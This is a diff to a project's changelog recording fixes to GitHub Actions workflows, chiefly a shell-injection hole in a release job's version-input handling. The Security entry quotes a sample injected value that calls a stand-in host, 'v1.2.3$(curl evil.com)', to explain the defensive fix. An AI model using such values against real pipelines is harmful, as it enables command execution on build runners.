@@ -5,6 +5,21 @@ All notable changes to this project will be documented in this file.
 The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
 and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
+## [Unreleased]
+
+### Security
+
+- **Tightened `release.yml` validator + shell-input plumbing (closes #211)** — three changes to `.github/workflows/release.yml` close a real shell-injection vector in the workflow_dispatch path:
+  * The `validate-tag-input` job's case pattern was a loose shell glob (`v[0-9]*.[0-9]*.[0-9]*`) that accepted shell metachars after the version root (e.g. `v1.2.3$(curl evil.com)` would pass). Replaced with a `grep -Eq '^v[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z.]+)?$'` anchored regex that rejects everything except the documented version shape.
+  * `inputs.version` and `github.event_name` were interpolated directly into `run:` blocks at the build `meta` step (line 332) and the publish `meta` step (line 658). GitHub Actions expands template expressions before shell execution, so a workflow_dispatch caller with `version='$(...)'` could inject shell. Moved both to `env:` blocks; `INPUT_VERSION` and the runner-supplied `GITHUB_EVENT_NAME` / `GITHUB_REF_NAME` are now referenced via shell variables.
+  * The publish job's `TAG=...` line used the same anti-pattern; replaced with `${INPUT_VERSION:-${GITHUB_REF_NAME}}`.
+
+### Fixed
+
+- **`ci.yml` now serializes per-ref (closes #215)** — added a `concurrency:` block keyed on `ci-${{ github.workflow }}-${{ github.ref }}` with `cancel-in-progress: ${{ github.event_name == 'pull_request' }}`. PR runs cancel each other so a re-pushed branch never queues a stale full-suite run; main / tag / manual runs do NOT cancel so the Actions tab keeps the red run visible while a fix lands.
+- **`release.yml` defensive output coupling (closes #217)** — the `dockerhub_image` / `ecr_image` GitHub Actions outputs were emitted only inside their enable conditional, leaving downstream cosign / SBOM guards with a potentially-undefined value if the conditional-output coupling ever broke. Added explicit empty-string / `enabled=false` echoes on the disabled branches and replaced the ECR branch's `if false; then` dead-code sentinel with a `ECR_DISABLED_FORCE:-` opt-in switch. Empty defaults are now always present, so future maintainers cannot trip over an undefined-output silent failure.
+- **Issue-template dropdown drift + version-stamp sync (closes #219)** — five `.github/ISSUE_TEMPLATE/*.yml` files carried a "choose the action version" dropdown with three distinct ids (`action-version`, `action-version-affected`, `affected-version`) and stale `@v2.10.0` / `v2.9.2` examples; `SECURITY.md:7` had drifted to `v2.11.1`. Standardised on id `action-version` and label `"Action version"` (`security.yml` keeps the more specific `"Affected action version"` label per the issue's exact wording); refreshed all example versions to `@v2.11.3` (current `VERSION`); updated `SECURITY.md` `Currently maintained` stamp to match. Also added the missing `validations: required: true` to `idea.yml`'s version dropdown so it matches the other four templates.
+
 ## [2.11.3] - 2026-09-04
 
 ### Security
